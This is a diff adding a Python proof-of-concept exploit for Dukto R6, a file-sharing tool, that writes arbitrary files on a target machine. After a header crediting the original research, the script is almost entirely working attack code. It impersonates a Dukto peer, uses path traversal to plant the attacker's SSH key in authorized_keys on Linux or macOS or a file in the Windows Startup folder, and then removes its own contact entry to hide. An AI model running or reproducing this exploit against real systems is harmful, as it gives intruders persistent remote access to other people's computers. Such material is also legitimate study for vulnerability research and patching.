@@ -1,0 +1,95 @@
+# Exploit Title: Dukto R6 - Remote Arbitrary File Write - POC
+# Date: 22/7/2018
+# Exploit Author: Ibtihaj
+# Vendor Homepage:http://www.msec.it/blog/
+# Software Link: http://www.msec.it/blog/?page_id=11
+# Version: R6
+# Tested on: Windows vista,7,8,8.1,10|Ubuntu 16.04,18.04|macOS 10.13
+# CVE : [if applicable]
+# Original Research By: Nicolas SURRIBAS (http://devloop.users.sourceforge.net/index.php?article121/dukto-recherche-de-vulnerabilites-et-exploitation)
+
+
+####################################################################################################################################################
+
+import socket
+import time
+import struct
+
+print "\n\t\t\tDukto R6 - Arbitrary File Write\n"
+print "Impersonation Information"
+
+uName=raw_input("User Name :")
+
+pcName=raw_input("Machine Name :")
+
+print "\n=========================================================\n"
+
+print "Target Information"
+
+tIp=raw_input("IP address of the target :")
+
+tOs=raw_input("Target OS (Windows: w,Ubuntu: u,OSX: m):")
+
+print "\n=========================================================\n"
+
+if tOs=="u"or tOs=="U":
+	print "In linux world-writable paths and user's home Directory can be used"
+	print "This will try to Add ssh keys in '.ssh' folder in user's home directory"
+	print "Name your file 'authorized_keys' and it should contain you ssh key"
+	print "Conditions*:\n\t1 On the target ssh should be enabled.\n\t2 The .ssh folder must be empty."
+	tFile=raw_input("File path:")
+	folder_name = ".ssh"
+	file_name = ".ssh/"
+
+elif tOs=="w"or tOs=="W":
+
+	print "This use startup folder to gain execution"
+	tFile=raw_input("File path:")
+	folder_name = "../"
+	file_name = "../AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/"
+elif tOs=="m"or tOs=="M":
+	print "In macos world-writable paths and user's home Directory can be used"
+	print "This will try to Add ssh keys in '.ssh' folder in user's home directory"
+	print "Name your file 'authorized_keys' and it should contain you ssh key"
+	print "Conditions*:\n\t1 On the target ssh should be enabled.\n\t2 The .ssh folder must be empty."
+	folder_name = "../.ssh"
+	file_name = "../.ssh/"
+	tFile=raw_input("File path:")
+else:
+	print "Enter a valid option"
+
+#==================================================================
+udp_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+udp_sock.sendto('\x01'+uName+' at '+pcName+' (101)', (tIp, 4644))
+time.sleep(0.1)
+udp_sock.close()
+ 
+sock = socket.socket()
+sock.connect((tIp, 4644))
+
+filee = tFile
+content = open(filee,'rb').read()
+
+concat_file_name = file_name+filee
+ 
+# 2 items : 1 folder entry + 1 file entry
+msg = struct.pack("QQ", 2, len(content))
+msg += folder_name + "\x00"
+msg += struct.pack("q", -1)  # this is a folder
+ 
+sock.send(msg)
+
+print len(content)
+msg = concat_file_name + "\x00"
+msg += struct.pack("Q", len(content))
+msg += content
+ 
+sock.send(msg)
+sock.close()
+
+
+#remove Our entry from targets contact list
+udp_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+udp_sock.sendto('\x03Bye Bye', (tIp, 4644))
+time.sleep(0.1)
+udp_sock.close()
